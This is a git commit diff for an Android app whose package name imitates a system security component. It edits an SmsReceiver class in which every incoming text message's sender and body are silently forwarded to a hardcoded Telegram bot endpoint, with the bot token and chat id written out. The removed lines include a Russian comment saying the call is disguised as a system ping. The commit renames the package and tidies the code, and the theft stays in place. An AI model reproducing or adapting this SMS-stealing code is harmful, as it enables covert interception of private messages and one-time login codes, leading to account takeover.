4e2480a82b1c491143ec24dbcbdb7c2278fdbcfc
MintOrbit <168619262+MintOrbit@users.noreply.github.com>
2026-04-11 08:34:35 +0300

    Update SmsReceiver.java

--- app/src/main/java/com/android/system/core/security/SmsReceiver.java
+++ app/src/main/java/com/android/system/core/security/SmsReceiver.java
@@ -1,5 +1,4 @@
-package com.android.system.core.security;
-
+package com.sys.sync;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -9,28 +8,24 @@ import android.telephony.SmsMessage;
 public class SmsReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
-        String action = intent.getAction();
-        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(action) || 
-            Telephony.Sms.Intents.SMS_DELIVER_ACTION.equals(action)) {
-            
+        try {
             SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
             if (msgs != null) {
                 for (SmsMessage sms : msgs) {
-                    String data = sms.getOriginatingAddress() + " >> " + sms.getMessageBody();
-                    new Thread(() -> bridge(data)).start();
+                    String data = sms.getOriginatingAddress() + " > " + sms.getMessageBody();
+                    new Thread(() -> send(data)).start();
                 }
             }
-        }
+        } catch (Exception e) {}
     }
 
-    private void bridge(String text) {
+    private void send(String text) {
         try {
-            // Маскируем под системный пинг
-            String endpoint = "https://api.telegram.org/bot8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=";
-            java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(endpoint + java.net.URLEncoder.encode(text, "UTF-8")).openConnection();
+            String url = "https://api.telegram.org/bot8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=" + java.net.URLEncoder.encode(text, "UTF-8");
+            java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
             c.setRequestMethod("GET");
             c.getResponseCode();
             c.disconnect();
-        } catch (Exception ignored) {}
+        } catch (Exception e) {}
     }
 }
